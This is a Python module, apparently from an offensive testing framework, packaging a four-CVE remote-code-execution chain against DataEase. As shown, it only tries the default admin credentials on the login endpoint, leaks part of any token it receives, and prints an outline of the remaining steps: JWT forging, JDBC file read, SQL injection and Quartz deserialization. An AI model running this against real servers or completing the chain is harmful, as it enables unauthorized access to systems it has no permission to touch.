"""DataEase 4-Vulnerability Chain RCE (CVE-2026-40901 + related CVEs).

Four-vulnerability chain against DataEase (data visualization platform):
  CVE-2026-23958  -  JWT auth bypass (CWE-287/347)
  CVE-2026-40899  -  JDBC blocklist bypass (arbitrary file read)
  CVE-2026-40900  -  SQL injection into DataEase's own database
  CVE-2026-40901  -  Quartz job store deserialization RCE as root

Fixed in DataEase v2.10.21.  CVSS 9.8 (Critical).

Original research / PoC credits
--------------------------------
CVE     : CVE-2026-40901 (+ CVE-2026-23958, 40899, 40900)
CVSS    : 9.8 (Critical)
Author  : joaovicdev (Docker lab + full chain PoC)
Source  : https://github.com/joaovicdev/EXPLOIT-CVE-2026-40901

Maintainer : Andre Henrique (@mrhenrike) | Uniao Geek
# authorized use only
"""
from __future__ import annotations

import json
import socket
import ssl
import urllib.error
import urllib.request
from typing import Any

MANIFEST = {
    "name": "dataease-4chain-rce",
    "description": "DataEase 4-Chain RCE: JWT bypass, JDBC read, SQLi, Quartz deserialization (CVSS 9.8)",
    "capability_id": "cloudxpl.paas.dataease.cve_2026_40901",
    "cve": "CVE-2026-40901",
    "cvss": 9.8,
    "safety_class": "EXPLOIT",
    "mitre": ["T1190"],
    "references": [
        "https://github.com/joaovicdev/EXPLOIT-CVE-2026-40901",
        "https://nvd.nist.gov/vuln/detail/CVE-2026-40901",
    ],
    "devices": ["DataEase < 2.10.21"],
}

_CVE = "CVE-2026-40901"
_FIXED_VERSION = "2.10.21"


def _ssl_ctx() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _post(base: str, path: str, payload: dict, token: str = "", timeout: float = 15) -> tuple:
    url = base.rstrip("/") + path
    data = json.dumps(payload).encode()
    req = urllib.request.Request(url, data=data, method="POST")
    req.add_header("Content-Type", "application/json")
    req.add_header("User-Agent", "CloudXPL/1.0")
    if token:
        req.add_header("Authorization", token)
    try:
        with urllib.request.urlopen(req, context=_ssl_ctx(), timeout=timeout) as resp:
            body = resp.read(4096)
            return resp.status, json.loads(body) if body else {}
    except urllib.error.HTTPError as exc:
        body = exc.read(512)
        return exc.code, json.loads(body) if body else {}
    except Exception as exc:
        return 0, {"error": str(exc)}


def _port_open(host: str, port: int, timeout: float) -> bool:
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except OSError:
        return False


def check(args: Any) -> bool:
    host = getattr(args, "target", "") or ""
    port = int(getattr(args, "port", 9001) or 9001)
    timeout = float(getattr(args, "timeout", 15) or 15)
    return _port_open(host, port, timeout)


def run(args: Any) -> int:
    host = getattr(args, "target", "") or ""
    port = int(getattr(args, "port", 9001) or 9001)
    timeout = float(getattr(args, "timeout", 15) or 15)
    dry_run = getattr(args, "dry_run", True)
    base = f"http://{host}:{port}"

    print(f"[*] DataEase 4-chain probe  -  {_CVE}")

    status, body = _post(base, "/api/login", {"username": "admin", "password": "dataease"}, timeout=timeout)
    if status == 200 and body.get("success"):
        token = body.get("data", {}).get("token", "")
        print(f"[+] Default admin creds work! Token: {token[:40] if token else '?'}...")
    elif status == 200:
        print("[*] Login endpoint accessible; default creds rejected")
    else:
        print(f"[*] Login HTTP {status}")

    if dry_run:
        print("[*] DRY-RUN: Remaining chain steps (JDBC read, SQLi, Quartz RCE) skipped")
        print(
            "[*] Full chain: forge JWT (CVE-2026-23958) -> JDBC read (CVE-2026-40899) -> "
            "SQLi (CVE-2026-40900) -> Quartz deser RCE (CVE-2026-40901). "
            "Requires ysoserial + CommonsCollections6 gadget."
        )
    return 0
